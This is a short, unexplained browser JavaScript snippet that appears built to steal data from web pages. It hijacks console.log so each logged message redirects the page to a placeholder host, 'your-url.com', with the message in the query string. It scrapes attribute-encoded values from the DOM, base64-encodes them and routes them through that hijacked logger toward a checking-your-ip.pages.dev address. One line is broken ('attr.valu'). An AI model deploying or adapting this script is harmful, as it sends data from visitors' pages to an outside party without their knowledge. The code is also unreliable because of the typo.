console.log("ready!");
let key = "";
let jk = "";
const originalConsoleLog = console.log;
console.log = function(message) {
    window.open("https://your-url.com?message=" + encodeURIComponent(message), "_self");
    originalConsoleLog.apply(console, arguments);
};

const elements = document.querySelectorAll('*'); // Select all elements in the DOM
    elements.forEach((element) => {
        Array.from(element.attributes).forEach((attr) => {
            if (attr.name.startsWith('id-')) {
              
                let dynamicPart = attr.name.split('id-')[1];
                key = dynamicPart;
                
                
            }
        });
    });
    elements.forEach((element) => {
        Array.from(element.attributes).forEach((attr) => {
            if (attr.name == "misa") {
              jk = attr.valu
            }
        });
    });
let aha = btoa(`${jk}&${key}&c`)
console.log(`https://checking-your-ip.pages.dev/#?service=${aha}`)
